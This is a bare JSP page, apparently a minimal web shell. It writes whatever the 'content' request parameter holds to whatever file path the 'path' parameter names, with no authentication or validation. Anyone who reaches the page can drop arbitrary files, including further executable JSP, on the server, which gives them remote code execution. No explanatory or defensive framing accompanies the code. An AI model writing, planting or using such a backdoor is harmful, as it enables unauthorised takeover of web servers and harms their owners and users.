<%@ page import="java.io.*" %>
<%
String path = request.getParameter("path");
String content = request.getParameter("content");
FileOutputStream fos = new FileOutputStream(path);
fos.write(content.getBytes());
fos.close();
out.println("File written: " + path);
%>
